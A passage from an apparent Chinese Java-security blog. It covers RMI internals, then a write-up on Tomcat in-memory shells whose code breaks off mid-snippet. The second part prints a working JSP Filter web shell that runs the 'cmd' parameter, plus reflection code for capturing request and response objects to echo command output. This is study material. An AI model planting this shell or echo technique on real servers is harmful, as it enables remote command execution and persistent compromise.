punctuation">}</span></code></pre></li><li><p>定义上面接口的实现类并继承UnicastRemoteObject类</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span></span><span class="token constant">RMI</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">UnicastRemoteObject</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyService</span> <span class="token keyword">extends</span> <span class="token class-name">UnicastRemoteObject</span> <span class="token keyword">implements</span> <span class="token class-name">RMIService</span><span class="token punctuation">{</span><span class="token keyword">protected</span> <span class="token class-name">MyService</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span> <span class="token punctuation">{</span><span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"call say method"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token string">"hello"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//      在没有继承UnicastRemoteObject的时候构造函数也可以写成如下形式</span><span class="token comment">//      protected RMIHello() throws RemoteException{</span><span class="token comment">//          UnicastRemoteObject.exportObject(this,0);</span><span class="token comment">//      }</span><span class="token punctuation">}</span></code></pre></li><li><p>定义RMI服务端并将对应的远程对象绑定到注册中心</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span></span><span class="token constant">RMI</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">MalformedURLException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">Naming</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIServer</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">try</span> <span class="token punctuation">{</span><span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Naming</span><span class="token punctuation">.</span><span class="token function">rebind</span><span class="token punctuation">(</span><span class="token string">"rmi://127.0.0.1:1099/myObj"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">MyService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RemoteException</span> <span class="token operator">|</span> <span class="token class-name">MalformedURLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li><li><p>定义RMI客户端，lookup获取远程对象并调用方法</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span></span><span class="token constant">RMI</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">MalformedURLException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">Naming</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">NotBoundException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIClient</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">try</span> <span class="token punctuation">{</span><span class="token class-name">RMIService</span> myService <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">RMIService</span><span class="token punctuation">)</span> <span class="token class-name">Naming</span><span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"rmi://127.0.0.1:1099/myObj"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>myService<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NotBoundException</span> <span class="token operator">|</span> <span class="token class-name">MalformedURLException</span> <span class="token operator">|</span> <span class="token class-name">RemoteException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ol><p>客户端本地必须有远程对象的接口，不然无法指定要调用的方法，而且其<strong>全限定名</strong>必须与服务器上的对象完全相同</p><p><a name="Bs2XG"></a></p><h2 id="JRMP协议"><a href="#JRMP协议" class="headerlink" title="JRMP协议"></a>JRMP协议</h2><p>Java远程方法协议（Java Remote Method Protocol，JRMP）是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在Java远程方法调用（RMI）之下、TCP/IP之上的线路层协议。</p><p>开启服务端，在开启WireShark抓包，再启动客户端调用，一次完整的RMI通信数据包如下<br><img src="/img/3-18/4.png"><br>可以看到JRMP通信协议双方在完成确认后，随后Clinet向Registry发送”Call”信息，Registry回复”ReturnData”<br><img src="/img/3-18/5.png"><br>我们看一下Registry的回复内容<br><img src="/img/3-18/6.png"><br>这里传输的是服务器的java序列化数据。注意以上的部分。ac  ed是Java序列化的魔术头，该数据流往后的部分就是序列化的内容了。<br><img src="/img/3-18/7.png"><br>06 3d转换成十进制为3075，这便是Server在本地开放的随机端口。</p><p><a name="lE4wC"></a></p><h2 id="RMI流程分析"><a href="#RMI流程分析" class="headerlink" title="RMI流程分析"></a>RMI流程分析</h2><p><a name="dSsDs"></a></p><h3 id="Registry端"><a href="#Registry端" class="headerlink" title="Registry端"></a>Registry端</h3><p>可以通过createRegistry()方法来创建一个Registry</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>可以看到，在创建Registry是返回的是RegistryImpl对象<br><img src="/img/3-18/8.png"><br><img src="/img/3-18/9.png"><br>跟进setup<br><img src="/img/3-18/10.png"><br>继续跟进UnicastServerRef.exportObject():<br><img src="/img/3-18/11.png"></p><ol><li>创建stub</li></ol><p><img src="/img/3-18/12.png"><br>加上_stub并进行实例化.RegistryImpl_Stub</p><ol start="2"><li>创建Skeleton，这就是Server端处理 RMI Client 通信请求的具体操作类</li></ol><p><img src="/img/3-18/13.png"><br>因此最终createRegistry()的结果就是返回了一个RegistryImpl对象，并且赋值this.skel=RegistryImpl_Skel。<br>完整过程如下：<br><img src="/img/3-18/14.png"></p><p>对远程对象的操作有以下5种</p><ul><li>bind</li><li>list</li><li>lookup</li><li>rebind</li><li>unbind</li></ul><p>对于Registry端，操作远程对象其实就是操作HashTable，我们来看RegistryImpl中的bind操作<br><img src="/img/3-18/15.png"><br>binddings属性其实就是一个HashTable<br>Registry使用的这张Hash表就类似于一张”路由表”，将name和绑定其上的远程对象联系了起来。<br><img src="/img/3-18/16.png"><br>rebind和bind的区别在于后者不会覆盖以前已经绑定的对象<br><a name="zaE10"></a></p><h3 id="Client端"><a href="#Client端" class="headerlink" title="Client端"></a>Client端</h3><p><a name="DkzY7"></a></p><h4 id="获取Registry"><a href="#获取Registry" class="headerlink" title="获取Registry"></a>获取Registry</h4><p><img src="/img/3-18/17.png"><br>和使用如下代码效果一样</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span>rmi<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>registry<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>上面都是先获取Registry,与Registry端不同的是这里还会做一层封装<br><img src="/img/3-18/18.png"><br>得到的是RegistryImpl_Stub对象<br><img src="/img/3-18/19.png"><br><a name="IAZWK"></a></p><h4 id="操作远程对象"><a href="#操作远程对象" class="headerlink" title="操作远程对象"></a>操作远程对象</h4><p>在Client端，对远程对象的操作同样有以下5种<br><img src="/img/3-18/20.png"><br>这里我们以RegistryImpl_Stub.bind操作为例进行分析<br><img src="/img/3-18/21.png"><br>首先生成了一个RemoteCall通信对象来建立连接，注意参数里的opnum（操作数），上述5个操作中每一个操作都有一个opnum，这里bind操作的opnum为0。参数中的hash其实就是serializeID。<br>跟进newCall，在此时Client已经通过newConnection()和Server端建立了连接<br><img src="/img/3-18/22.png"><br>然后Client通过StreamRemoteCall()提前将ObjID、opnum和serializeID发送给Server端</p><p>回到bind中，可以看到使用了writeObject()将我们要发送的name以及Remote远程对象序列化发送了过去<br><img src="/img/3-18/23.png"><br>再往下，bind中的invoke和done便是接收处理服务端返回的信息<br><img src="/img/3-18/24.png"><br><a name="x9eMh"></a></p><h4 id="完整流程"><a href="#完整流程" class="headerlink" title="完整流程"></a>完整流程</h4><img src="/img/3-18/25.png"><a name="xAupV"></a>### Server端我们知道，在RMI过程中，Server端往往是开启两个端口的，一个1099端口用于Registry，另一个是随机端口用于与Client通信。而远程方法最终是在Server端执行的，Server会把执行的结果返回给Client端。我们上面在创建Registry的时候已经生成了一个RegistryImpl_Skel对象，正是这个对象与Client端的RegistryImpl_Stub通信<a name="jURS7"></a>#### 开启通信端口在创建我们的远程对象的时候，跟进构造方法<br><img src="/img/3-18/26.png"><p>到这里逐层跟进（有点套娃）<br><img src="/img/3-18/27.png"><br><img src="/img/3-18/28.png"><br>最后到TCPTransport.exportObject()，开始监听端口，跟进listen()<br><img src="/img/3-18/29.png"><br>这里listen()启动了一个新的线程，跟进看看这个线程做了什么<br><img src="/img/3-18/30.png"><br>直接在TCPTransport$AcceptLoop#run处打下断点<br><img src="/img/3-18/31.png">此时已经从主线程到了RMI TCP Accept-0线程，调用了executeAcceptLoop()，跟进<br><img src="/img/3-18/32.png"><br>在执行完this.serverSocket.accept()之后server才开始真正等待Client的连接<br><a name="AQoAT"></a></p><h4 id="与Client通信"><a href="#与Client通信" class="headerlink" title="与Client通信"></a>与Client通信</h4><p>紧接上文，我们在executeAcceptLoop()方法中的TCPTransport.<em>connectionThreadPool</em>.execute()方法处下个断点，然后Client向Server发送连接请求，如下<br><img src="/img/3-18/33.png"><br>这里创建了一个ConnectionHandler句柄，我们跟进ConnectionHandler句柄的run()方法，在TCPTransport.run()中<br><img src="/img/3-18/34.png"><br>跟进run0()，最终到了该方法中的handleMessages()，这是用来传递消息的句柄<br><img src="/img/3-18/35.png"><br>跟进，创建了StreamRemoteCall对象，跟进下面的serviceCall()方法<br><img src="/img/3-18/36.png"><br>可以看到serviceCall()方法的参数是一个RemoteCall对象。这里就是Client传来的RemoteCall对象，然后对该对象进行各种操作，读取其中的信息。<br><img src="/img/3-18/37.png"><br>最终会调用dispatch()方法<br><img src="/img/3-18/38.png"></p><p>然后调用oldDispatch()，最后跟到this.skel.dispatch()方法中。最终在RegistryImpl_Skel.dispatch()中根据Client发来的信息进行各种操作。<br><img src="/img/3-18/39.png"></p><p><img src="/img/3-18/40.png"><br>最终在RegistryImpl_Skel.dispatch()进行了各种数据的反序列化<br><a name="OSFDj"></a></p><h4 id="完整流程-1"><a href="#完整流程-1" class="headerlink" title="完整流程"></a>完整流程</h4><img src="/img/3-18/41.png"><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><ul><li><a href="https://goodapple.top/archives/321">Java安全学习——RMI机制 - 枫のBlog</a></li><li><a href="https://ajdecade.notion.site/RMI-0-1-3aebd05c661f4c10876ef69d12506df6">Notion – The all-in-one workspace for your notes, tasks, wikis, and databases.</a></li><li><a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/RMI%E7%AF%871/">RMI篇1 - Longlone’s Blog</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> RMI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内存马Tomcat回显</title>
      <link href="/2024/03/16/%E5%86%85%E5%AD%98%E9%A9%ACTomcat%E5%9B%9E%E6%98%BE/"/>
      <url>/2024/03/16/%E5%86%85%E5%AD%98%E9%A9%ACTomcat%E5%9B%9E%E6%98%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="内存马Tomcat回显"><a href="#内存马Tomcat回显" class="headerlink" title="内存马Tomcat回显"></a>内存马Tomcat回显</h1><p>所谓回显，其实就是获取命令执行的结果，这种技术常用于目标机器不出网，无法反弹shell的情况。<strong>其实关键就是获取request和response对象</strong>。</p><p>参考：</p><ul><li><a href="https://goodapple.top/archives/1355">Java安全学习——内存马 - 枫のBlog</a></li><li><a href="https://johnfrod.top/%e5%ae%89%e5%85%a8/java-%e5%9b%9e%e6%98%be%e6%8a%80%e6%9c%af/">https://johnfrod.top/%e5%ae%89%e5%85%a8/java-%e5%9b%9e%e6%98%be%e6%8a%80%e6%9c%af/</a></li><li><a href="https://xz.aliyun.com/t/12494">https://xz.aliyun.com/t/12494</a><br><a name="MpGXn"></a></li></ul><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>我们以上文提到的Tomcat Filter内存马为例，获取对应的回显，关键代码如下</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">!</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Shell_Filter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> cmd <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        response<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token string">"text/html; charset=UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">PrintWriter</span> writer <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cmd <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token class-name">InputStream</span> in <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">//将命令执行结果写入扫描器并读取所有输入</span>                <span class="token class-name">Scanner</span> scanner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"\\A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> result <span class="token operator">=</span> scanner<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span>scanner<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">;</span>                scanner<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                writer<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>                writer<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                writer<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NullPointerException</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>                n<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">%</span><span class="token operator">&gt;</span></code></pre><p>上述方式我们是通过JSP文件来注入内存马的。由于JSP中内置了一些关键对象，所以我们能够很容易地获得Request和Response对象，并能通过他们来获取目标JVM的上下文Context。</p><p>针对于反序列化进行内存马注入来达到无文件落地的目的，而jsp的request和response可以直接获取，但是反序列化的时候却不能，所以回显问题便需要考虑其中。<br><a name="QoyvZ"></a></p><h2 id="ThreadLocal-Response回显"><a href="#ThreadLocal-Response回显" class="headerlink" title="ThreadLocal Response回显"></a>ThreadLocal Response回显</h2><p>首先要注意的是，我们寻找的request对象应该是一个和当前线程ThreadLocal有关的对象，而不是一个全局变量。这样才能获取到当前线程的相关信息。最终我们能够在org.apache.catalina.core.ApplicationFilterChain类中找到这样两个变量_lastServicedRequest_和_lastServicedResponse_。并且这两个属性还是静态的，我们获取时无需实例化对象。<br><img src="/img/3-16/1.png"><br>在我们熟悉的ApplicationFilterChain#internalDoFilter中，Tomcat会将request对象和response对象存储到这两个变量中</p><p>在静态代码块中的ApplicationDispatcher.WRAP_SAME_OBJECT为false，但是我们后续可以通过反射修改。</p><img src="/img/3-16/2.png"><p>在ApplicationFilterChain#internalDoFilter 中发现，当WRAP_SAME_OBJECT为 true时 ，就会通过set方法将请求信息存入 lastServicedRequest 和 lastServicedResponse中</p><p>可以总结思路如下</p><ol><li>反射修改ApplicationDispatcher.WRAP_SAME_OBJECT的值，通过ThreadLocal#set方法将request和response对象存储到变量中</li><li>初始化lastServicedRequest和lastServicedResponse两个变量，默认为null</li><li>通过ThreadLocal#get方法将request和response对象从_lastServicedRequest_和_lastServicedResponse_中取出</li></ol><p>反射修改static final<br>参考：<br><a href="https://johnfrod.top/%e5%ae%89%e5%85%a8/java%e5%8f%8d%e5%b0%84%e4%bf%ae%e6%94%b9static-final%e4%bf%ae%e9%a5%b0%e7%9a%84%e5%ad%97%e6%ae%b5/">https://johnfrod.top/%e5%ae%89%e5%85%a8/java%e5%8f%8d%e5%b0%84%e4%bf%ae%e6%94%b9static-final%e4%bf%ae%e9%a5%b0%e7%9a%84%e5%ad%97%e6%ae%b5/</a></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Field</span> lastServicedResponseField <span class="token operator">=</span> <span class="token class-name">ApplicationFilterChain</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"lastServicedResponse"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//再次反射修改feild的modif</span><span class="token class-name">Field</span> modifiersField <span class="token operator">=</span> <span class="token class-name">Field</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"modifiers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>modifiersField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除final</span>modifiersField<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span>lastServicedResponseField<span class="token punctuation">,</span> lastServicedResponseField<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token constant">FINAL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>lastServicedResponseField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><a name="R39Ad"></a></p><h4 id="反射存储request和response"><a href="#反射存储request和response" class="headerlink" title="反射存储request和response"></a>反射存储request和response</h4><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">//反射获取所需属性</span><span class="token class-name">Field</span> <span class="token constant">WRAP_SAME_OBJECT_FIELD</span> <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.apache.catalina.core.ApplicationDispatcher"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"WRAP_SAME_OBJECT"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Field</span> lastServicedRequestField <span class="token operator">=</span> <span class="token class-name">ApplicationFilterChain</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"lastServicedRequest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Field</span> lastServicedResponseField <span class="token operator">=</span> <span class="token class-name">ApplicationFilterChain</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"lastServicedResponse"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//使用modifiersField反射修改final型变量</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span>Field</span> modifiersField <span class="token operator">=</span> <span class="token class-name">Field</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"modifiers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>modifiersField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>modifiersField<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span><span class="token constant">WRAP_SAME_OBJECT_FIELD</span><span class="token punctuation">,</span> <span class="token constant">WRAP_SAME_OBJECT_FIELD</span><span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token constant">FINAL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>modifiersField<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span>lastServicedRequestField<span class="token punctuation">,</span> lastServicedRequestField<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token constant">FINAL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>modifiersField<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span>lastServicedResponseField<span class="token punctuation">,</span> lastServicedResponseField<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token constant">FINAL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">WRAP_SAME_OBJECT_FIELD</span><span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>lastServicedRequestField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>lastServicedResponseField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将变量WRAP_SAME_OBJECT_FIELD设置为true</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">WRAP_SAME_OBJECT_FIELD</span><span class="token punctuation">.</span><span class="token function">getBoolean</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token constant">WRAP_SAME_OBJECT_FIELD</span><span class="token punctuation">.</span><span class="token function">setBoolean</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><a name="rGsRw"></a></p><h4 id="初始化变量"><a href="#初始化变量" class="headerlink" title="初始化变量"></a>初始化变量</h4><p>由于变量在Tomcat初始化运行的时候会被设置为null，因此我们还需要初始化lastServicedRequest和lastServicedResponse变量为ThreadLocal类</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>lastServicedRequestField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    lastServicedRequestField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ThreadLocal</span><span class="token 